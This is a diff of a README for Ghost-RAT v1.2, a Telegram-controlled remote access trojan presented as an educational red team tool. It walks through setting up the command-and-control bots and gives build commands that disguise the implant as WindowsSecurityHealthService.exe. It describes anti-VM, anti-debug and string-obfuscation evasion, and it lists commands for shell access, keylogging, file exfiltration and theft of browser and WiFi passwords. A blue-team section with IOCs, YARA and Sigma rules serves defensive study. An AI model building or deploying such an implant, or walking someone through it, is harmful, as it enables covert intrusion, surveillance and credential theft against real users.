@@ -1,4 +1,4 @@
-# 👻 Ghost-RAT v1.1
+# 👻 Ghost-RAT v1.2
 
 ### Advanced Telegram C2 Remote Access Tool — Educational Red Team Project
 
@@ -13,44 +13,46 @@
 > - **Cybersecurity education** and training
 >
 > **You MUST only use this on systems you own or have explicit written permission to test.**
-> Unauthorized access to computer systems is **illegal** under laws including the Computer Fraud and Abuse Act (CFAA), IT Act 2000, and equivalent legislation worldwide.
+> Unauthorized access to computer systems is **illegal** under the CFAA, IT Act 2000, and equivalent laws worldwide.
 >
-> **The authors take no responsibility for misuse of this tool.**
+> **The authors take no responsibility for misuse.**
 
 ---
 
 ## 📋 Table of Contents
 
-- [Overview](#overview)
-- [Two-Bot Architecture](#two-bot-architecture)
+- [What's New in v1.2](#whats-new-in-v12)
+- [Architecture](#architecture)
 - [Features](#features)
 - [File Structure](#file-structure)
 - [Setup Guide](#setup-guide)
 - [Building the Implant](#building-the-implant)
 - [Usage Guide](#usage-guide)
 - [Command Reference](#command-reference)
-- [Detection & Analysis](#detection--analysis)
+- [Detection & Analysis (Blue Team)](#detection--analysis-blue-team)
 - [Troubleshooting](#troubleshooting)
 
 ---
 
-## 🔍 Overview
+## 🆕 What's New in v1.2
 
-Ghost-RAT is a lightweight, multi-victim Remote Access Trojan that uses **Telegram** as its Command & Control (C2) channel. It demonstrates how real-world RATs operate for defensive security research:
-
-- **Implant** → Runs on Windows victim machines (compiled to `.exe`)
-- **C2 Server** → Runs on the attacker's Linux machine
-- **Communication** → All traffic flows through a Telegram Bot in a private group
-- **Persistence** → Registry Run key + Scheduled Task + Startup Folder
-- **Multi-victim** → Unique victim IDs allow targeting individual or all victims
+| Feature | Description |
+|---------|-------------|
+| **Anti-VM / Anti-Debug** | Detects VMware, VirtualBox, Hyper-V, debuggers, and sandboxes |
+| **String Obfuscation** | XOR + base64 encoding defeats basic `strings` analysis |
+| **Non-Blocking Keylogger** | Runs in background thread — no longer freezes the polling loop |
+| **Exponential Backoff** | Smart retry on network failures (avoids burning bandwidth) |
+| **Connection Pooling** | `requests.Session()` for keep-alive and performance |
+| **Evasion Reporting** | Check-in messages include evasion mode and detection results |
+| **Browser Decrypt Fix** | Proper AES-GCM error handling, DPAPI prefix validation |
+| **Command History** | `/logs` command on C2 for audit trail |
+| **Improved Build** | Better PyInstaller command with hidden imports and fake name |
 
 ---
 
-## 🏗️ Two-Bot Architecture
+## 🏗️ Architecture
 
-Ghost-RAT uses **two separate Telegram bots** to avoid a critical Telegram API limitation:
-
-> **Why two bots?** Telegram's `getUpdates` API only allows **one consumer per bot**. If both the implant and C2 server poll with the same bot token, they steal each other's messages. Using separate bots solves this cleanly.
+Ghost-RAT uses **two separate Telegram bots** to avoid Telegram's `getUpdates` single-consumer limitation:
 
 ```
 ┌──────────────────────┐                              ┌──────────────────────┐
@@ -62,17 +64,18 @@ Ghost-RAT uses **two separate Telegram bots** to avoid a critical Telegram API l
 │  - Polls getUpdates  │    │  Both bots are       │  │  - Polls getUpdates  │
 │  - Sends results     │    │  members of this     │  │  - Reads check-ins   │
 │  - Executes commands │    │  group               │  │  - Logs activity     │
-│                      │    └──────────────────────┘  │  - SQLite tracking   │
+│  - Anti-VM checks    │    └──────────────────────┘  │  - SQLite tracking   │
+│  - String obfuscation│                              │  - Command history   │
 └──────────────────────┘                              └──────────────────────┘
 ```
 
-**Flow:**
-1. Implant starts → generates unique victim ID → installs persistence
-2. Implant sends check-in message via **Implant Bot** (BOT_TOKEN)
-3. C2 server reads check-in via **Observer Bot** (C2_BOT_TOKEN) → registers victim in SQLite
-4. Operator types command in group: `GHOST-XXXXXXXX /sysinfo`
-5. Implant polls via Implant Bot, finds command, executes, sends result
-6. C2 server reads result via Observer Bot → logs to database
+**Implant Startup Flow:**
+1. Acquire mutex (prevent duplicates)
+2. Run anti-VM / anti-debug checks (configurable behavior)
+3. Generate unique victim ID (hardware fingerprint)
+4. Install persistence (3 methods)
+5. Check-in to Telegram group (with retry + backoff)
+6. Poll for commands with jitter
 
 ---
 
@@ -81,43 +84,55 @@ Ghost-RAT uses **two separate Telegram bots** to avoid a critical Telegram API l
 ### Core
 | Feature | Description |
 |---------|-------------|
-| Unique Victim ID | SHA-256 hash of hostname + MAC + username + disk serial → `GHOST-XXXXXXXX` |
-| Persistence | Registry Run Key + Scheduled Task + Startup Folder (3 methods) |
-| Jitter | 30-60 second randomized check-in intervals |
-| Multi-victim | Target specific victims or broadcast to all |
-| Mutex | Prevents duplicate instances from running |
-| Retry Logic | Check-in retries with exponential backoff |
-| Heartbeat | Periodic re-check-in to keep last_seen timestamp fresh |
+| Unique Victim ID | SHA-256 of hostname + MAC + username + disk serial → `GHOST-XXXXXXXX` |
+| Persistence | Registry Run + Scheduled Task + Startup Folder (3 methods) |
+| Jitter | 30-60s randomized intervals |
+| Multi-victim | Target specific victims or broadcast `@all` |
+| Mutex | Prevents duplicate instances |
+| Retry + Backoff | Exponential backoff on consecutive network failures |
+| Heartbeat | Periodic re-check-in to keep `last_seen` fresh |
 
-### Implant Commands
+### Security / Evasion
+| Feature | Description |
+|---------|-------------|
+| Anti-VM | Registry keys, WMI model, MAC OUI, guest tool files |
+| Anti-Debug | `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()` |
+| Anti-Sandbox | Low resources, analysis tools, sandbox usernames, uptime |
+| String Obfuscation | XOR + base64 for API URLs, registry paths, mutex names |
+| Evasion Modes | `exit` (quit), `report` (log + continue), `disabled` (skip) |
+
+### Implant Commands (22)
 | Command | Description |
 |---------|-------------|
-| `/sysinfo` | OS, hostname, IP, user, architecture |
-| `/screenshot` | Capture full screen |
+| `/sysinfo` | OS, hostname, IP, user, arch |
+| `/screenshot` | Capture screen |
 | `/webcam` | Webcam snapshot |
-| `/shell <cmd>` | Execute any shell command |
+| `/shell <cmd>` | Execute shell command |
 | `/cd <path>` | Change directory |
-| `/ls [path]` | List directory contents |
-| `/upload <path>` | Exfiltrate file from victim |
+| `/ls [path]` | List directory |
+| `/upload <path>` | Exfiltrate file |
 | `/download <url> <path>` | Download file to victim |
-| `/clipboard` | Dump clipboard contents |
-| `/wifi` | Extract saved WiFi passwords |
-| `/keylog [seconds]` | Record keystrokes (default 30s) |
-| `/search <pattern>` | Search for files (glob pattern) |
-| `/browsers` | Chrome saved passwords (DPAPI + AES-GCM) |
-| `/proclist` | List running processes |
-| `/prockill <pid>` | Kill a process |
-| `/shutdown` | Shutdown victim machine |
-| `/restart` | Restart victim machine |
-| `/selfdestruct` | Remove persistence + delete implant |
-| `/help` | Show command reference |
+| `/clipboard` | Dump clipboard |
+| `/wifi` | Saved WiFi passwords |
+| `/keylog [secs]` | Capture keystrokes (non-blocking) |
+| `/keylog_stop` | Stop active keylogger |
+| `/search <pattern>` | Search files |
+| `/browsers` | Chrome passwords (DPAPI + AES-GCM) |
+| `/proclist` | List processes |
+| `/prockill <pid>` | Kill process |
+| `/antivm` | Check VM/debug/sandbox status |
+| `/shutdown` | Shutdown machine |
+| `/restart` | Restart machine |
+| `/selfdestruct` | Remove & delete implant |
+| `/help` | Show help |
 
 ### C2 Server Commands
 | Command | Description |
 |---------|-------------|
 | `/victims` | List all registered victims |
-| `/remove <id>` | Remove a victim from the database |
-| `/help` | Show command reference |
+| `/remove <id>` | Remove a victim |
+| `/logs [N]` | Show recent command history |
+| `/help` | Show help |
 
 ---
 
@@ -125,20 +140,22 @@ Ghost-RAT uses **two separate Telegram bots** to avoid a critical Telegram API l
 
 ```
 ghost-rat/
-├── implant.py              # Main Windows implant payload
-├── c2_server.py            # Linux C2 server (Observer bot)
-├── config.py               # Configuration (both bot tokens, group ID, settings)
+├── implant.py              # Windows implant payload (v1.2)
+├── c2_server.py            # Linux C2 server (observer bot)
+├── config.py               # Configuration (tokens, evasion mode, timing)
 ├── requirements.txt        # Python dependencies
 ├── README.md               # This file
 ├── utils/
 │   ├── __init__.py
-│   ├── victim_id.py        # Unique victim ID generation & caching
-│   └── persistence.py      # Registry + Scheduled Task + Startup Folder
+│   ├── victim_id.py        # Unique victim ID generation
+│   ├── persistence.py      # Registry + schtask + startup folder
+│   ├── evasion.py          # Anti-VM / anti-debug / anti-sandbox [NEW]
+│   └── obfuscation.py      # XOR + base64 string obfuscation [NEW]
 ├── commands/
 │   ├── __init__.py
-│   └── handler.py          # Command dispatcher (20 commands)
+│   └── handler.py          # Command dispatcher (22 commands)
 └── dist/
-    └── Ghost-RAT.exe       # Compiled implant (after build)
+    └── WindowsSecurityHealthService.exe   # Compiled implant
 ```
 
 ---
@@ -146,45 +163,35 @@ ghost-rat/
 ## 🛠️ Setup Guide
 
 ### Prerequisites
-- **Python 3.9+** on both machines
+- **Python 3.9+**
 - A **Telegram account**
-- **Windows VM** (victim — isolated, no internet access to real targets)
+- **Windows VM** (victim — isolated!)
 - **Linux machine** (attacker — or WSL)
 
 ### Step 1: Create the Implant Bot
-
-1. Open Telegram and message **@BotFather**
-2. Send `/newbot` → name it something like `GhostImplantBot`
-3. Copy the **Bot Token** → this is your `BOT_TOKEN`
+1. Message **@BotFather** → `/newbot` → name it e.g. `GhostImplantBot`
+2. Copy the **Bot Token** → `BOT_TOKEN`
 
 ### Step 2: Create the Observer Bot (C2)
+1. Message **@BotFather** → `/newbot` → name it e.g. `GhostC2Bot`
+2. Copy the **Bot Token** → `C2_BOT_TOKEN`
 
-1. Message **@BotFather** again
-2. Send `/newbot` → name it something like `GhostC2Bot`
-3. Copy the **Bot Token** → this is your `C2_BOT_TOKEN`
+### Step 3: Create a Private Group
+1. Create a group, add **both bots**
+2. Send a message, visit `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates`
+3. Find `"chat": {"id": -100XXXXXXXXXX}` → `GROUP_CHAT_ID`
 
-### Step 3: Create a Private Telegram Group
-
-1. Create a new group in Telegram
-2. **Add BOTH bots** to the group
-3. Send any message in the group
-4. Visit `https://api.telegram.org/bot<BOT_TOKEN>/getUpdates` in a browser
-5. Find the `"chat": {"id": -100XXXXXXXXXX}` — this is your **GROUP_CHAT_ID**
-
-### Step 4: Configure Ghost-RAT
-
+### Step 4: Configure
 Edit `config.py`:
-
 ```python
-BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ"         # Implant bot
-C2_BOT_TOKEN = "0987654321:ZYXwvuTSRqpONMlkjIHGfedCBA"      # Observer bot
+BOT_TOKEN = "1234567890:ABCdef..."          # Implant bot
+C2_BOT_TOKEN = "0987654321:ZYXwvu..."       # Observer bot
 GROUP_CHAT_ID = "-100XXXXXXXXXX"
+EVASION_MODE = "report"                      # "exit", "report", or "disabled"
 ```
 
 ### Step 5: Install Dependencies
-
 ```bash
-# On BOTH machines (or just the build machine):
 pip install -r requirements.txt
 ```
 
@@ -192,141 +199,130 @@ pip install -r requirements.txt
 
 ## 🔨 Building the Implant
 
-### Compile to a single Windows .exe:
+### Recommended build command:
 
 ```bash
-pyinstaller --onefile --noconsole --name Ghost-RAT \
+pyinstaller --onefile --noconsole \
+  --name WindowsSecurityHealthService \
   --hidden-import=pynput.keyboard._win32 \
   --hidden-import=pynput.mouse._win32 \
   implant.py
 ```
 
-**Flags explained:**
-- `--onefile` → Single standalone .exe (no extra files needed)
-- `--noconsole` → No command prompt window appears when running
-- `--name Ghost-RAT` → Output filename
-- `--hidden-import` → Required for pynput keylogger to work in compiled .exe
-
-The compiled `.exe` will be in the `dist/` folder:
-```
-dist/Ghost-RAT.exe
-```
-
-### Optional: Add a custom icon
+### With a custom icon:
 ```bash
-pyinstaller --onefile --noconsole --name Ghost-RAT --icon=myicon.ico \
+pyinstaller --onefile --noconsole \
+  --name WindowsSecurityHealthService \
+  --icon=myicon.ico \
   --hidden-import=pynput.keyboard._win32 \
   --hidden-import=pynput.mouse._win32 \
   implant.py
 ```
 
-### Optional: UPX compression (smaller .exe)
+### With UPX compression:
 ```bash
-# Install UPX first, then:
-pyinstaller --onefile --noconsole --name Ghost-RAT --upx-dir=/path/to/upx \
+pyinstaller --onefile --noconsole \
+  --name WindowsSecurityHealthService \
+  --upx-dir=/path/to/upx \
   --hidden-import=pynput.keyboard._win32 \
   --hidden-import=pynput.mouse._win32 \
   implant.py
 ```
+
+**Output**: `dist/WindowsSecurityHealthService.exe`
+
+> **Why `WindowsSecurityHealthService`?** The name mimics a legitimate Windows service. This is for educational purposes — to demonstrate how real malware blends in.
 
 ---
 
 ## 🚀 Usage Guide
 
-### 1. Start the C2 Server (Attacker — Linux)
-
+### 1. Start C2 Server
 ```bash
 python3 c2_server.py
 ```
 
-You should see:
-```
-    ╔═══════════════════════════════════════════╗
-    ║           👻 GHOST-RAT C2 SERVER          ║
-    ║       Educational Red Team Tool v1.1      ║
-    ╚═══════════════════════════════════════════╝
+### 2. Deploy Implant
+Copy `.exe` to Windows VM and run it.
 
-2024-01-01 12:00:00 [INFO] Database initialized: victims.db
-2024-01-01 12:00:00 [INFO] Using OBSERVER bot token (C2_BOT_TOKEN) — no conflict with implant polling
-2024-01-01 12:00:00 [INFO] ✅ C2 server is ONLINE. Waiting for victims...
-```
-
-### 2. Deploy the Implant (Victim — Windows VM)
-
-Copy `dist/Ghost-RAT.exe` to the Windows VM and run it. The implant will:
-1. Check for existing instances (mutex)
-2. Generate a unique victim ID
-3. Install persistence (3 methods)
-4. Send a check-in message to the Telegram group (with retry)
-5. Begin polling for commands
-
-### 3. Send Commands (Telegram Group)
-
-In the Telegram group, send commands using the format:
-
+### 3. Send Commands
 ```
 GHOST-A1B2C3D4 /sysinfo
+GHOST-A1B2C3D4 /screenshot
+@all /proclist
 ```
 
-Or broadcast to ALL victims:
-```
-@all /screenshot
-```
-
-### 4. View Registered Victims
-
-In the Telegram group:
+### 4. View Victims & Logs
 ```
 /victims
-```
-
-### 5. Remove a Victim
-
-```
-/remove GHOST-A1B2C3D4
+/logs 10
 ```
 
 ---
 
 ## 🔬 Detection & Analysis (Blue Team)
 
-This section helps SOC analysts and blue teamers understand what to look for:
+### Network Indicators (IOCs)
+- **DNS**: Queries to `api.telegram.org`
+- **HTTPS**: Periodic POST/GET to `https://api.telegram.org/bot*/...`
+- **Beaconing**: Regular 30-60s intervals with slight jitter (look for periodicity)
+- **Backoff Pattern**: Intervals increase exponentially on failures (behavioral signature)
+- **User-Agent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
+- **Two Bot Tokens**: Traffic to two different bot endpoints from the same network
 
-### Network Indicators
-- **Telegram API traffic**: HTTPS connections to `api.telegram.org`
-- **Periodic beaconing**: Regular HTTP(S) requests every 30-60 seconds with slight jitter
-- **File uploads**: Large POST requests to Telegram's file upload endpoint
-- **Two distinct bot tokens**: Watch for traffic to two different bot endpoints
+### Host Indicators (IOCs)
+| Artifact | Location |
+|----------|----------|
+| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth` |
+| Scheduled Task | `WindowsSecurityHealth` in Task Scheduler |
+| Startup Folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityHealth.exe` |
+| Victim ID File | `%APPDATA%\.ghost_id` (hidden) |
+| Mutex | `Global\GhostRAT_WindowsSecurityHealth` |
+| Process | `WindowsSecurityHealthService.exe` (unsigned, network connections) |
+| Temp Files | `%TEMP%\ss_*.png`, `%TEMP%\cam_*.png`, `%TEMP%\login_data_*.db` |
 
-### Host Indicators
-- **Registry**: Check `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for `WindowsSecurityHealth`
-- **Scheduled Tasks**: Look for task named `WindowsSecurityHealth` in Task Scheduler
-- **Startup Folder**: Check `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` for unexpected `.exe` files
-- **Processes**: Look for unsigned executables with network connections to `api.telegram.org`
-- **File System**: Hidden `.ghost_id` file in `%APPDATA%`
-- **Mutex**: Named mutex `Global\GhostRAT_WindowsSecurityHealth`
+### Anti-Analysis Detection (for analysts)
+Ghost-RAT v1.2 checks for analysis environments. Analysts should be aware:
+- **VM Detection**: Checks registry for VMware/VirtualBox keys, WMI model strings, MAC OUI prefixes, guest tool files
+- **Debugger Detection**: `IsDebuggerPresent()` and `CheckRemoteDebuggerPresent()` Windows API calls
+- **Sandbox Detection**: CPU count < 2, RAM < 2GB, analysis tool processes (wireshark, procmon, x64dbg, etc.), sandbox usernames, system uptime < 10 minutes
+- **Bypass**: Set `EVASION_MODE = "disabled"` in `config.py` for lab analysis, or use `ScyllaHide` to hide debuggers
 
-### YARA Rule (Example)
+### String Obfuscation Analysis
+- Strings are XOR'd with key `0x5A` and base64-encoded
+- To decode: `echo "ENCODED_STRING" | base64 -d | python3 -c "import sys; print(bytes(b^0x5A for b in sys.stdin.buffer.read()).decode())"` 
+- Look for `base64.b64decode` and XOR patterns in decompiled code
+
+### YARA Rule
 ```yara
-rule Ghost_RAT {
+rule Ghost_RAT_v12 {
     meta:
-        description = "Detects Ghost-RAT implant"
+        description = "Detects Ghost-RAT v1.2 implant"
         author = "SOC Team"
         severity = "high"
+        version = "1.2"
     strings:
-        $s1 = "GHOST-RAT CHECK-IN" ascii
-        $s2 = "ghost_id" ascii
-        $s3 = "WindowsSecurityHealth" ascii
-        $s4 = "api.telegram.org" ascii
-        $s5 = "GhostRAT_" ascii
+        $checkin = "GHOST-RAT CHECK-IN" ascii wide
+        $ghost_id = "ghost_id" ascii
+        $implant_name = "WindowsSecurityHealth" ascii
+        $telegram = "api.telegram.org" ascii
+        $mutex_pattern = "GhostRAT_" ascii
+        $evasion1 = "IsDebuggerPresent" ascii
+        $evasion2 = "CheckRemoteDebuggerPresent" ascii
+        $obf_xor = { 5A }
+        $b64_decode = "b64decode" ascii
     condition:
-        3 of ($s*)
+        uint16(0) == 0x5A4D and    // MZ header (PE file)
+        3 of ($checkin, $ghost_id, $implant_name, $telegram, $mutex_pattern) or
+        (2 of ($evasion1, $evasion2) and $b64_decode)
 }
 ```
 
-### Sigma Rule (Example)
+### Sigma Rules
+
+#### Registry Persistence
 ```yaml
-title: Ghost-RAT Persistence Detection
+title: Ghost-RAT Registry Persistence
 status: experimental
 logsource:
     category: registry_set
@@ -339,9 +335,26 @@ detection:
 level: high
 ```
 
-### Sigma Rule — Mutex Detection
+#### Scheduled Task Creation
 ```yaml
-title: Ghost-RAT Mutex Detection
+title: Ghost-RAT Scheduled Task
+status: experimental
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains|all:
+            - 'schtasks'
+            - 'WindowsSecurityHealth'
+            - 'ONLOGON'
+    condition: selection
+level: high
+```
+
+#### Mutex Detection
+```yaml
+title: Ghost-RAT Mutex
 status: experimental
 logsource:
     category: create_mutex
@@ -353,55 +366,53 @@ detection:
 level: critical
 ```
 
+#### Telegram Beaconing
+```yaml
+title: Ghost-RAT Telegram C2 Beaconing
+status: experimental
+logsource:
+    category: proxy
+detection:
+    selection:
+        dst|contains: 'api.telegram.org'
+        http_method: 'POST'
+    timeframe: 5m
+    condition: selection | count() > 3
+level: medium
+```
+
 ---
 
 ## 🔧 Troubleshooting
 
-### "BOT_TOKEN not configured!"
-→ Edit `config.py` and set your Telegram Implant bot token.
+### Config Errors
+| Error | Fix |
+|-------|-----|
+| `BOT_TOKEN not configured!` | Edit `config.py` with your implant bot token |
+| `C2_BOT_TOKEN not configured!` | Create a 2nd bot via @BotFather for C2 |
+| `GROUP_CHAT_ID not configured!` | Find chat ID via Telegram API |
 
-### "C2_BOT_TOKEN not configured!"
-→ Create a second bot via @BotFather for the C2 observer. Set it in `config.py`.
+### Implant Issues
+| Issue | Fix |
+|-------|-----|
+| Implant exits immediately | Check `EVASION_MODE` — set to `"disabled"` in VMs |
+| No check-in received | Verify both bots are in the group + internet access |
+| Commands not executing | Ensure correct victim ID format + message from group |
+| Keylogger not returning results | v1.2 keylogger is non-blocking — results arrive after duration |
 
-### "GROUP_CHAT_ID not configured!"
-→ Follow Step 3 in Setup to find your group's chat ID.
-
-### Implant doesn't check in
-1. Verify **both bots** are in the group
-2. Check internet connectivity on the Windows VM
-3. Run `implant.py` directly (not as `.exe`) to see error messages
-4. Ensure the bots have permission to read/send messages in the group
-5. Check that `BOT_TOKEN` (not `C2_BOT_TOKEN`) is set correctly for the implant
-
-### PyInstaller build fails
-```bash
-# Try upgrading PyInstaller:
-pip install --upgrade pyinstaller
-
-# Full build command with all hidden imports:
-pyinstaller --onefile --noconsole \
-  --hidden-import=pynput.keyboard._win32 \
-  --hidden-import=pynput.mouse._win32 \
-  --name Ghost-RAT implant.py
-```
-
-### Commands not executing
-- Make sure you're using the correct victim ID format: `GHOST-XXXXXXXX`
-- The implant only processes messages from the configured group
-- Check that the command format matches exactly (e.g., `/shell whoami`, not `shell whoami`)
-- Remember: commands go through the **Implant Bot**, management through the **C2 Bot**
-
-### C2 server not seeing check-ins
-- Make sure the **Observer Bot** (C2_BOT_TOKEN) is added to the group
-- The C2 server uses a **different bot** than the implant — this is by design
-- Both bots must be members of the same private group
+### Build Issues
+| Issue | Fix |
+|-------|-----|
+| PyInstaller fails | `pip install --upgrade pyinstaller` |
+| pynput missing in .exe | Add `--hidden-import=pynput.keyboard._win32` |
+| Large .exe size | Use UPX compression: `--upx-dir=/path/to/upx` |
 
 ---
 
 ## 📜 License
 
-This project is provided for **educational purposes only**. No warranty is provided. Use responsibly and legally.
+Educational purposes only. No warranty. Use responsibly and legally.
 
 ---
 
-*Built for cybersecurity education and defensive research. v1.1*
+*Built for cybersecurity education and defensive research. Ghost-RAT v1.2*
